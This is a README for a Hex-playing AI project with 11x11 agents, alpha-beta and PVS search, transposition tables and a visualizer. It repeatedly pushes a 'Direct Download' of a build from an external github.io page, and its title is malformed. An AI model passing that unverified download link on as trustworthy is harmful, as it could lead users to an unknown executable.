# Hex Game AI v - Game Script Utility 2026

> Hex-playing AI agents for the AICA Game AI Platform, focused on move choice, search, position evaluation, and game analysis for the 11x11 board game.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-AICA%20Game%20AI%20Platform%20%2F%20Python-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ryanio1991/hex-ai-game-script-tool?style=flat-square)](https://github.com/ryanio1991/hex-ai-game-script-tool)

---

<p align="center">
  <a href="https://ryanio1991.github.io/hex-ai-game-script-tool/">
    <img src="https://img.shields.io/badge/Download-Hex%20Game%20AI%20Script-brightgreen?style=for-the-badge" alt="Download Hex Game AI Script">
  </a>
</p>

> **[Direct Download - Hex Game AI](https://ryanio1991.github.io/hex-ai-game-script-tool/)**

---

[Download Latest Build](https://ryanio1991.github.io/hex-ai-game-script-tool/)

---

## Project Summary

Hex Game AI provides a collection of Hex agents built for the AICA Game AI Platform and Python-oriented workflows. Its main purpose is to support decision-making on an 11x11 board through search, evaluation, and board-state tracking.

The repository bundles several agent variants that represent successive refinements in strength and move quality. The main engine combines iterative-deepening alpha-beta search with position scoring inspired by electrical-resistance ideas, plus tactical handling for bridges and virtual connections.

## What the Script Includes

- Supports Hex play on an 11x11 board
- Offers multiple agent versions that show incremental progress
- Runs iterative-deepening alpha-beta search
- Uses principal-variation search to narrow exploration toward strong lines
- Orders moves with killer-move heuristics
- Caches explored positions with Zobrist hashing and a transposition table
- Detects victories using bitboard-driven win logic
- Provides opening book support and tactical safety checks
- Monitors bridge patterns and virtual connections during play
- Ships with an interactive visualizer and a benchmarking arena

## Getting Started

1. Download or clone the repository into the workspace you want to use.
2. Put the project into a Python-ready environment that can execute AICA Game AI Platform components.
3. Open the primary agent or launcher file for your setup.
4. Run the agent on Hex positions or through the visualizer to examine its behavior.

Example workflow:

- Load the Hex position or match state
- Start the agent
- Let the search finish and return a move
- Inspect the result in the visualizer or arena tools

## Configuration

Common tuning points for the script usually include search depth, timing, and evaluation settings.

| Option | Purpose |
| --- | --- |
| Iterative deepening | Expands search depth step by step within available time |
| Alpha-beta / PVS | Reduces the number of branches explored |
| Transposition table | Reuses previously evaluated positions |
| Opening book | Applies early-game move guidance |
| Tactical guards | Helps avoid unstable or unsafe local choices |
| Evaluation mode | Switches how board positions are scored |
| Visualization | Enables review in the interactive viewer |
| Benchmarking | Compares agents in the arena environment |

## Compatibility

Hex Game AI is intended for the AICA Game AI Platform and Python-based execution. It is centered on Hex for the 11x11 board and organized around agent play, analysis, and benchmarking.

Known limitations may include:

- Board size assumptions centered on 11x11 play
- Behavior depending on the available platform runtime
- Search quality varying with time limits and configuration
- Evaluation strength changing across agent versions

## Frequently Asked Questions

### How do I begin using it?
Download the project, place it in your working directory, and run it in the environment expected by the AICA Game AI Platform setup.

### Does it contain more than one agent?
Yes. The repository includes multiple agent versions that reflect different stages of improvement.

### Can I tune the search behavior?
Yes. The project exposes search and evaluation concepts such as iterative deepening, alpha-beta search, PVS, and transposition-table usage.

### Which board does it support?
The feature set is built around Hex played on an 11x11 board.

### Is there a visual way to inspect matches?
Yes. An interactive visualizer is included for reviewing positions and play.

### Does it include benchmarking?
Yes. The project ships with a benchmarking arena for comparing agent behavior.

### Can search results be stored or reused?
Yes. The design uses Zobrist hashing and a transposition table for position reuse.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
